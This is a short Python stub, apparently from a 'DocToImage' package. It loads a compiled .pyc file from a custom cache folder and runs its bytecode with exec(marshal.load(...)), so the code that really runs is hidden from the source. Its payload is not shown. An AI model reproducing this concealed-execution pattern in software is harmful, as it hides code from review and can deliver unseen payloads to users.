
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'DocToImage_204b5165d8364b89bb540ca1ac374d8d.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
